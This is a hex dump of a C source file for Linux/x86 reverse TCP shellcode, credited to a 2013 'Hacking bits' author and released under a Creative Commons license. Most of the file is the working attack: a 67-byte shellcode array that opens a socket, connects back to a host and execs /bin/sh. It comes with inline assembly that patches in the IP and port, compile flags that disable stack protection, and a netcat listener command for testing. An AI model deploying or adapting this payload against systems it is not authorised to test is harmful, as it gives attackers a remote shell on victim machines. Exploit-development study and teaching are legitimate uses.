00000000  2f 2a 0a 0a 20 54 69 6e  79 20 53 68 65 6c 6c 20  |/*.. Tiny Shell |
00000010  52 65 76 65 72 73 65 20  54 43 50 20 53 68 65 6c  |Reverse TCP Shel|
00000020  6c 63 6f 64 65 20 2d 20  43 20 4c 61 6e 67 75 61  |lcode - C Langua|
00000030  67 65 0a 20 4c 69 6e 75  78 2f 78 38 36 0a 0a 20  |ge. Linux/x86.. |
00000040  57 72 69 74 74 65 6e 20  69 6e 20 32 30 31 33 20  |Written in 2013 |
00000050  62 79 20 47 65 79 73 6c  61 6e 20 47 2e 20 42 65  |by Geyslan G. Be|
00000060  6d 2c 20 48 61 63 6b 69  6e 67 20 62 69 74 73 0a  |m, Hacking bits.|
00000070  0a 20 20 20 68 74 74 70  3a 2f 2f 68 61 63 6b 69  |.   http://hacki|
00000080  6e 67 62 69 74 73 2e 63  6f 6d 0a 20 20 20 67 65  |ngbits.com.   ge|
00000090  79 73 6c 61 6e 40 67 6d  61 69 6c 2e 63 6f 6d 0a  |yslan@gmail.com.|
000000a0  0a 20 54 68 69 73 20 73  6f 75 72 63 65 20 69 73  |. This source is|
000000b0  20 6c 69 63 65 6e 73 65  64 20 75 6e 64 65 72 20  | licensed under |
000000c0  74 68 65 20 43 72 65 61  74 69 76 65 20 43 6f 6d  |the Creative Com|
000000d0  6d 6f 6e 73 0a 20 41 74  74 72 69 62 75 74 69 6f  |mons. Attributio|
000000e0  6e 2d 53 68 61 72 65 41  6c 69 6b 65 20 33 2e 30  |n-ShareAlike 3.0|
000000f0  20 42 72 61 7a 69 6c 20  4c 69 63 65 6e 73 65 2e  | Brazil License.|
00000100  0a 0a 20 54 6f 20 76 69  65 77 20 61 20 63 6f 70  |.. To view a cop|
00000110  79 20 6f 66 20 74 68 69  73 20 6c 69 63 65 6e 73  |y of this licens|
00000120  65 2c 20 76 69 73 69 74  0a 0a 20 20 20 68 74 74  |e, visit..   htt|
00000130  70 3a 2f 2f 63 72 65 61  74 69 76 65 63 6f 6d 6d  |p://creativecomm|
00000140  6f 6e 73 2e 6f 72 67 2f  6c 69 63 65 6e 73 65 73  |ons.org/licenses|
00000150  2f 62 79 2d 73 61 2f 33  2e 30 2f 0a 0a 20 59 6f  |/by-sa/3.0/.. Yo|
00000160  75 20 61 72 65 20 66 72  65 65 3a 0a 0a 20 20 20  |u are free:..   |
00000170  20 74 6f 20 53 68 61 72  65 20 2d 20 74 6f 20 63  | to Share - to c|
00000180  6f 70 79 2c 20 64 69 73  74 72 69 62 75 74 65 20  |opy, distribute |
00000190  61 6e 64 20 74 72 61 6e  73 6d 69 74 20 74 68 65  |and transmit the|
000001a0  20 77 6f 72 6b 0a 20 20  20 20 74 6f 20 52 65 6d  | work.    to Rem|
000001b0  69 78 20 2d 20 74 6f 20  61 64 61 70 74 20 74 68  |ix - to adapt th|
000001c0  65 20 77 6f 72 6b 0a 20  20 20 20 74 6f 20 6d 61  |e work.    to ma|
000001d0  6b 65 20 63 6f 6d 6d 65  72 63 69 61 6c 20 75 73  |ke commercial us|
000001e0  65 20 6f 66 20 74 68 65  20 77 6f 72 6b 0a 0a 20  |e of the work.. |
000001f0  55 6e 64 65 72 20 74 68  65 20 66 6f 6c 6c 6f 77  |Under the follow|
00000200  69 6e 67 20 63 6f 6e 64  69 74 69 6f 6e 73 3a 0a  |ing conditions:.|
00000210  20 20 20 41 74 74 72 69  62 75 74 69 6f 6e 20 2d  |   Attribution -|
00000220  20 59 6f 75 20 6d 75 73  74 20 61 74 74 72 69 62  | You must attrib|
00000230  75 74 65 20 74 68 65 20  77 6f 72 6b 20 69 6e 20  |ute the work in |
00000240  74 68 65 20 6d 61 6e 6e  65 72 0a 20 20 20 20 20  |the manner.     |
00000250  20 20 20 20 20 20 20 20  20 20 20 20 73 70 65 63  |            spec|
00000260  69 66 69 65 64 20 62 79  20 74 68 65 20 61 75 74  |ified by the aut|
00000270  68 6f 72 20 6f 72 20 6c  69 63 65 6e 73 6f 72 20  |hor or licensor |
00000280  28 62 75 74 0a 20 20 20  20 20 20 20 20 20 20 20  |(but.           |
00000290  20 20 20 20 20 20 6e 6f  74 20 69 6e 20 61 6e 79  |      not in any|
000002a0  20 77 61 79 20 74 68 61  74 20 73 75 67 67 65 73  | way that sugges|
000002b0  74 73 20 74 68 61 74 20  74 68 65 79 0a 20 20 20  |ts that they.   |
000002c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 65 6e  |              en|
000002d0  64 6f 72 73 65 20 79 6f  75 20 6f 72 20 79 6f 75  |dorse you or you|
000002e0  72 20 75 73 65 20 6f 66  20 74 68 65 20 77 6f 72  |r use of the wor|
000002f0  6b 29 2e 0a 0a 20 20 20  53 68 61 72 65 20 41 6c  |k)...   Share Al|
00000300  69 6b 65 20 2d 20 49 66  20 79 6f 75 20 61 6c 74  |ike - If you alt|
00000310  65 72 2c 20 74 72 61 6e  73 66 6f 72 6d 2c 20 6f  |er, transform, o|
00000320  72 20 62 75 69 6c 64 20  75 70 6f 6e 0a 20 20 20  |r build upon.   |
00000330  20 20 20 20 20 20 20 20  20 20 20 20 20 20 74 68  |              th|
00000340  69 73 20 77 6f 72 6b 2c  20 79 6f 75 20 6d 61 79  |is work, you may|
00000350  20 64 69 73 74 72 69 62  75 74 65 20 74 68 65 0a  | distribute the.|
00000360  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000370  20 72 65 73 75 6c 74 69  6e 67 20 77 6f 72 6b 20  | resulting work |
00000380  6f 6e 6c 79 20 75 6e 64  65 72 20 74 68 65 20 73  |only under the s|
00000390  61 6d 65 20 6f 72 0a 20  20 20 20 20 20 20 20 20  |ame or.         |
000003a0  20 20 20 20 20 20 20 20  73 69 6d 69 6c 61 72 20  |        similar |
000003b0  6c 69 63 65 6e 73 65 20  74 6f 20 74 68 69 73 20  |license to this |
000003c0  6f 6e 65 2e 0a 0a 2a 2f  0a 0a 2f 2a 0a 0a 20 74  |one...*/../*.. t|
000003d0  69 6e 79 5f 73 68 65 6c  6c 5f 72 65 76 65 72 73  |iny_shell_revers|
000003e0  65 5f 74 63 70 5f 73 68  65 6c 6c 63 6f 64 65 0a  |e_tcp_shellcode.|
000003f0  0a 20 2a 20 36 37 20 62  79 74 65 73 0a 20 2a 20  |. * 67 bytes. * |
00000400  6e 75 6c 6c 2d 66 72 65  65 20 69 66 20 74 68 65  |null-free if the|
00000410  20 49 50 20 61 6e 64 20  70 6f 72 74 20 61 72 65  | IP and port are|
00000420  0a 0a 0a 20 23 20 67 63  63 20 2d 6d 33 32 20 2d  |... # gcc -m32 -|
00000430  66 6e 6f 2d 73 74 61 63  6b 2d 70 72 6f 74 65 63  |fno-stack-protec|
00000440  74 6f 72 20 2d 7a 20 65  78 65 63 73 74 61 63 6b  |tor -z execstack|
00000450  20 74 69 6e 79 5f 73 68  65 6c 6c 5f 72 65 76 65  | tiny_shell_reve|
00000460  72 73 65 5f 74 63 70 5f  73 68 65 6c 6c 63 6f 64  |rse_tcp_shellcod|
00000470  65 2e 63 20 2d 6f 20 74  69 6e 79 5f 73 68 65 6c  |e.c -o tiny_shel|
00000480  6c 5f 72 65 76 65 72 73  65 5f 74 63 70 5f 73 68  |l_reverse_tcp_sh|
00000490  65 6c 6c 63 6f 64 65 0a  0a 20 54 65 73 74 69 6e  |ellcode.. Testin|
000004a0  67 0a 20 23 20 6e 63 20  2d 6c 20 31 32 37 2e 31  |g. # nc -l 127.1|
000004b0  2e 31 2e 31 20 31 31 31  31 31 0a 20 23 20 2e 2f  |.1.1 11111. # ./|
000004c0  74 69 6e 79 5f 73 68 65  6c 6c 5f 72 65 76 65 72  |tiny_shell_rever|
000004d0  73 65 5f 74 63 70 5f 73  68 65 6c 6c 63 6f 64 65  |se_tcp_shellcode|
000004e0  0a 0a 2a 2f 0a 0a 0a 23  69 6e 63 6c 75 64 65 20  |..*/...#include |
000004f0  3c 73 74 64 69 6f 2e 68  3e 0a 23 69 6e 63 6c 75  |<stdio.h>.#inclu|
00000500  64 65 20 3c 73 74 72 69  6e 67 2e 68 3e 0a 0a 75  |de <string.h>..u|
00000510  6e 73 69 67 6e 65 64 20  63 68 61 72 20 63 6f 64  |nsigned char cod|
00000520  65 5b 5d 20 3d 20 5c 0a  0a 22 5c 78 33 31 5c 78  |e[] = \.."\x31\x|
00000530  64 62 5c 78 66 37 5c 78  65 33 5c 78 62 30 5c 78  |db\xf7\xe3\xb0\x|
00000540  36 36 5c 78 34 33 5c 78  35 32 5c 78 35 33 5c 78  |66\x43\x52\x53\x|
00000550  36 61 22 0a 22 5c 78 30  32 5c 78 38 39 5c 78 65  |6a"."\x02\x89\xe|
00000560  31 5c 78 63 64 5c 78 38  30 5c 78 35 39 5c 78 39  |1\xcd\x80\x59\x9|
00000570  33 5c 78 62 30 5c 78 33  66 5c 78 63 64 22 0a 22  |3\xb0\x3f\xcd"."|
00000580  5c 78 38 30 5c 78 34 39  5c 78 37 39 5c 78 66 39  |\x80\x49\x79\xf9|
00000590  5c 78 62 30 5c 78 36 36  5c 78 36 38 5c 78 37 66  |\xb0\x66\x68\x7f|
000005a0  5c 78 30 31 5c 78 30 31  22 0a 22 5c 78 30 31 5c  |\x01\x01"."\x01\|
000005b0  78 36 36 5c 78 36 38 5c  78 32 62 5c 78 36 37 5c  |x66\x68\x2b\x67\|
000005c0  78 36 36 5c 78 36 61 5c  78 30 32 5c 78 38 39 5c  |x66\x6a\x02\x89\|
000005d0  78 65 31 22 0a 22 5c 78  36 61 5c 78 31 30 5c 78  |xe1"."\x6a\x10\x|
000005e0  35 31 5c 78 35 33 5c 78  38 39 5c 78 65 31 5c 78  |51\x53\x89\xe1\x|
000005f0  63 64 5c 78 38 30 5c 78  62 30 5c 78 30 62 22 0a  |cd\x80\xb0\x0b".|
00000600  22 5c 78 35 32 5c 78 36  38 5c 78 32 66 5c 78 32  |"\x52\x68\x2f\x2|
00000610  66 5c 78 37 33 5c 78 36  38 5c 78 36 38 5c 78 32  |f\x73\x68\x68\x2|
00000620  66 5c 78 36 32 5c 78 36  39 22 0a 22 5c 78 36 65  |f\x62\x69"."\x6e|
00000630  5c 78 38 39 5c 78 65 33  5c 78 33 31 5c 78 63 39  |\x89\xe3\x31\xc9|
00000640  5c 78 63 64 5c 78 38 30  22 3b 0a 0a 6d 61 69 6e  |\xcd\x80";..main|
00000650  20 28 29 0a 7b 0a 0a 20  20 20 20 20 20 20 20 2f  | ().{..        /|
00000660  2f 20 57 68 65 6e 20 74  68 65 20 50 6f 72 74 20  |/ When the Port |
00000670  63 6f 6e 74 61 69 6e 73  20 6e 75 6c 6c 20 62 79  |contains null by|
00000680  74 65 73 2c 20 70 72 69  6e 74 66 20 77 69 6c 6c  |tes, printf will|
00000690  20 73 68 6f 77 20 61 20  77 72 6f 6e 67 20 73 68  | show a wrong sh|
000006a0  65 6c 6c 63 6f 64 65 20  6c 65 6e 67 74 68 2e 0a  |ellcode length..|
000006b0  0a 09 70 72 69 6e 74 66  28 22 53 68 65 6c 6c 63  |..printf("Shellc|
000006c0  6f 64 65 20 4c 65 6e 67  74 68 3a 20 20 25 64 5c  |ode Length:  %d\|
000006d0  6e 22 2c 20 73 74 72 6c  65 6e 28 63 6f 64 65 29  |n", strlen(code)|
000006e0  29 3b 0a 0a 09 2f 2f 20  50 6f 6c 6c 75 74 65 73  |);...// Pollutes|
000006f0  20 61 6c 6c 20 72 65 67  69 73 74 65 72 73 20 65  | all registers e|
00000700  6e 73 75 72 69 6e 67 20  74 68 61 74 20 74 68 65  |nsuring that the|
00000710  20 73 68 65 6c 6c 63 6f  64 65 20 72 75 6e 73 20  | shellcode runs |
00000720  69 6e 20 61 6e 79 20 63  69 72 63 75 6d 73 74 61  |in any circumsta|
00000730  6e 63 65 2e 0a 0a 09 5f  5f 61 73 6d 5f 5f 20 28  |nce....__asm__ (|
00000740  22 6d 6f 76 6c 20 24 30  78 66 66 66 66 66 66 66  |"movl $0xfffffff|
00000750  66 2c 20 25 65 61 78 5c  6e 5c 74 22 0a 09 09 20  |f, %eax\n\t"... |
00000760  22 6d 6f 76 6c 20 25 65  61 78 2c 20 25 65 62 78  |"movl %eax, %ebx|
00000770  5c 6e 5c 74 22 0a 09 09  20 22 6d 6f 76 6c 20 25  |\n\t"... "movl %|
00000780  65 61 78 2c 20 25 65 63  78 5c 6e 5c 74 22 0a 09  |eax, %ecx\n\t"..|
00000790  09 20 22 6d 6f 76 6c 20  25 65 61 78 2c 20 25 65  |. "movl %eax, %e|
000007a0  64 78 5c 6e 5c 74 22 0a  09 09 20 22 6d 6f 76 6c  |dx\n\t"... "movl|
000007b0  20 25 65 61 78 2c 20 25  65 73 69 5c 6e 5c 74 22  | %eax, %esi\n\t"|
000007c0  0a 09 09 20 22 6d 6f 76  6c 20 25 65 61 78 2c 20  |... "movl %eax, |
000007d0  25 65 64 69 5c 6e 5c 74  22 0a 09 09 20 22 6d 6f  |%edi\n\t"... "mo|
000007e0  76 6c 20 25 65 61 78 2c  20 25 65 62 70 5c 6e 5c  |vl %eax, %ebp\n\|
000007f0  74 22 0a 0a 09 2f 2f 20  53 65 74 74 69 6e 67 20  |t"...// Setting |
00000800  74 68 65 20 49 50 0a 09  09 20 22 6d 6f 76 6c 20  |the IP... "movl |
00000810  24 30 78 30 31 30 31 30  31 37 66 2c 20 28 63 6f  |$0x0101017f, (co|
00000820  64 65 2b 32 37 29 5c 6e  5c 74 22 0a 0a 09 2f 2f  |de+27)\n\t"...//|
00000830  20 53 65 74 74 69 6e 67  20 74 68 65 20 70 6f 72  | Setting the por|
00000840  74 0a 09 09 20 22 6d 6f  76 77 20 24 30 78 36 37  |t... "movw $0x67|
00000850  32 62 2c 20 28 63 6f 64  65 2b 33 33 29 5c 6e 5c  |2b, (code+33)\n\|
00000860  74 22 0a 0a 09 2f 2f 20  43 61 6c 6c 69 6e 67 20  |t"...// Calling |
00000870  74 68 65 20 73 68 65 6c  6c 63 6f 64 65 0a 09 09  |the shellcode...|
00000880  20 22 63 61 6c 6c 20 63  6f 64 65 22 29 3b 0a 0a  | "call code");..|
00000890  7d                                                |}|
00000891
